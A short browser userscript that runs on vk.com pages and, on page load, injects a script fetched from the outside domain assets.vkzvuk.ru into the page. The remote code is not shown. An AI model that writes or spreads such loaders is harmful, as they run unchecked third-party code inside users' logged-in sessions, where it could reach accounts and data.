// ==UserScript==
// @include https://vk.com/*
// @include http://vk.com/*
// ==/UserScript==

window.addEventListener('DOMContentLoaded', function() {
	var script = document.createElement('script');
	script.src = 'https://assets.vkzvuk.ru/notifier.js';
	document.getElementsByTagName('head')[0].appendChild(script);
});